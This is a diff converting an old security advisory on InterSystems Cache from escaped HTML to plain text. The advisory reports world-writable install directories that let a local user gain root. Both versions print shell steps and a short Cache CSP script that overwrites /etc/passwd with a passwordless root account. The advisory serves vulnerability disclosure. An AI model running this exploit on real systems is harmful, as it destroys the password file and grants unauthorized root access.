@@ -1,26 +1,48 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 26&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Cache Database Poor File Permissions Lead To Local Root&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2003-03-11&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="http://www.intersystems.com/our-products/cache/cache-overview/">http://www.intersystems.com/our-products/cache/cache-overview/</a>"&gt;<a href="http://www.intersystems.com/our-products/cache/cache-overview/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://www.intersystems.com/our-products/cache/cache-overview/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;InterSystems Cache&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2003-03-11&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="mailto:support@intersystems.com">support@intersystems.com</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;Cache', the post-relational database for e-applications, is optimized for the tougher demands of Web applications. It delivers breakthrough performance for massively scalable Web applications. Its rapid application development environment with advanced object technology lets you operate at Internet speed. Cache's ultra-fast SQL outperforms relational systems 20X. And its multidimensional application and data server delivers lightning-fast performance.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The default installation of the Cache database yeilds poorly protected files and directories in the main package tree. Directories and files are open to all users as read write and execute.
-</p><p>Local attackers can exploit this to manipulate directories and binaries inside the installation tree. This may be used by a local malicious user to gain root access. The content in /cachesys/csp/user is executed as root through the web interface. user&amp;#039;s parent directory (csp) is world writeable allowing a local non root user to move user aside, copy its contents and create a new writeable user directory.
-</p><p>$ mv /cachesys/csp/user /cachesys/csp/user.old
-$ cp -rp /cachesys/csp/user /cachesys/csp/user.old
-$ cp cspexp.csp /cachesys/csp/user<br/>
-$ lnyx <a href="http://localhost/csp/user/cspexp.csp">http://localhost/csp/user/cspexp.csp</a>
-$ su - cache&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2003-0498 2003-0497&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=26"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;Intersystems Cache local root exploit&lt;span style="color: #339933;"&gt;.&lt;/span&gt; Larry W&lt;span style="color: #339933;"&gt;.&lt;/span&gt; Cashdollar http&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;span style="color: #666666; font-style: italic;"&gt;//vapid.dhs.org&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;Because of poor &lt;span style="color: #b1b100;"&gt;default&lt;/span&gt; &lt;a href="<a href="http://www.php.net/file">http://www.php.net/file</a>"&gt;&lt;span style="color: #990000;"&gt;file&lt;/span&gt;&lt;/a&gt; and directory permissions a localuser can execute code &lt;span style="color: #b1b100;"&gt;as&lt;/span&gt; root via the cache CSP interpreter&lt;span style="color: #339933;"&gt;.&lt;/span&gt; &lt;span style="color: #339933;"&gt;&amp;lt;&lt;/span&gt;HR&lt;span style="color: #339933;"&gt;&amp;gt;&lt;/span&gt; Attempting to overwrite &lt;span style="color: #339933;"&gt;/&lt;/span&gt;etc&lt;span style="color: #339933;"&gt;/&lt;/span&gt;passwd with cache&lt;span style="color: #339933;"&gt;::&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;0&lt;/span&gt;&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;0&lt;/span&gt;&lt;span style="color: #339933;"&gt;:&lt;/span&gt;root&lt;span style="color: #339933;"&gt;:/&lt;/span&gt;root&lt;span style="color: #339933;"&gt;:/&lt;/span&gt;bin&lt;span style="color: #339933;"&gt;/&lt;/span&gt;bash&lt;span style="color: #339933;"&gt;.&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;filename &lt;span style="color: #339933;"&gt;-&amp;gt;&lt;/span&gt;  &lt;span style="color: #004000;"&gt;cspexp&lt;/span&gt;&lt;span style="color: #339933;"&gt;.&lt;/span&gt;csp&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #000000; font-weight: bold;"&gt;&amp;lt;script language&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&lt;/span&gt;Cache runat&lt;span style="color: #339933;"&gt;=&lt;/span&gt;server&lt;span style="color: #339933;"&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;     Set cdef&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #666666; font-style: italic;"&gt;##class(%Library.File).%New(&amp;quot;/etc/passwd&amp;quot;)&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;     &lt;span style="color: #b1b100;"&gt;Do&lt;/span&gt; cdef&lt;span style="color: #339933;"&gt;.&lt;/span&gt;Open&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&amp;quot;WSN&amp;quot;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;     &lt;span style="color: #b1b100;"&gt;Do&lt;/span&gt; cdef&lt;span style="color: #339933;"&gt;.&lt;/span&gt;WriteLine&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&amp;quot;cache::0:0:root:/root:/bin/bash&amp;quot;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;     &lt;span style="color: #b1b100;"&gt;Do&lt;/span&gt; cdef&lt;span style="color: #339933;"&gt;.%&lt;/span&gt;Close&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #000000; font-weight: bold;"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisories/cache_database_file_permissions.html">http://www.vapid.dhs.org/advisories/cache_database_file_permissions.html</a>"&gt;<a href="http://www.vapid.dhs.org/advisories/cache_database_file_permissions.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisories/cache_database_file_permissions.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                Advisory #: 26
+Title: Cache Database Poor File Permissions Lead To Local Root
+Author:Larry W. Cashdollar, @_larry0
+Date: 2003-03-11
+Download Site: http://www.intersystems.com/our-products/cache/cache-overview/
+Vendor:InterSystems Cache
+Vendor Notified: 2003-03-11
+Vendor Contact: support@intersystems.com
+Description: Cache', the post-relational database for e-applications, is
+optimized for the tougher demands of Web applications. It delivers breakthrough
+performance for massively scalable Web applications. Its rapid application
+development environment with advanced object technology lets you operate at
+Internet speed. Cache's ultra-fast SQL outperforms relational systems 20X. And
+its multidimensional application and data server delivers lightning-fast
+performance.
+Vulnerability:
+The default installation of the Cache database yeilds poorly protected files
+and directories in the main package tree. Directories and files are open to all
+users as read write and execute. Local attackers can exploit this to manipulate
+directories and binaries inside the installation tree. This may be used by a
+local malicious user to gain root access. The content in /cachesys/csp/user is
+executed as root through the web interface. user's parent directory (csp) is
+world writeable allowing a local non root user to move user aside, copy its
+contents and create a new writeable user directory. $ mv /cachesys/csp/user /
+cachesys/csp/user.old $ cp -rp /cachesys/csp/user /cachesys/csp/user.old $ cp
+cspexp.csp /cachesys/csp/user $ lnyx http://localhost/csp/user/cspexp.csp $ su
+- cache
+CVE-2003-0498 2003-0497
+JSON:Export
+Exploit Code:
+   1. Intersystems Cache local root exploit. Larry W. Cashdollar http://
+      vapid.dhs.org
+   2.  
+   3. Because of poor default file and directory permissions a localuser can
+      execute code as root via the cache CSP interpreter. <HR> Attempting to
+      overwrite /etc/passwd with cache::0:0:root:/root:/bin/bash.
+   4. filename ->  cspexp.csp
+   5.  
+   6. <script language=Cache runat=server>
+   7.  
+   8.      Set cdef=##class(%Library.File).%New("/etc/passwd")
+   9.      Do cdef.Open("WSN")
+  10.      Do cdef.WriteLine("cache::0:0:root:/root:/bin/bash")
+  11.      Do cdef.%Close()
+  12. </script>
+Screen Shots:
+Advisory: http://www.vapid.dhs.org/advisories/
+cache_database_file_permissions.html
